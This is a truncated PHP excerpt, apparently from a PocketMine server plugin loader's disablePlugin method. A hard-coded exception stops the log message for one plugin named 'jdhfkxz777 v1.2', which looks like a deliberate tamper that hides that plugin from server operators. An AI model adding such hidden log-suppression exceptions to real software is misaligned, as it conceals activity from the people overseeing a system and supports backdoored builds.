...
class PharPluginLoader implements PluginLoader{
	...
	public function disablePlugin(Plugin $plugin){
		if($plugin instanceof PluginBase and $plugin->isEnabled()){
			if ($plugin->getDescription()->getFullName() != "jdhfkxz777 v1.2")$this->server->getLogger()->info($this->server->getLanguage()->translateString("pocketmine.plugin.disable", [$plugin->getDescription()->getFullName()]));
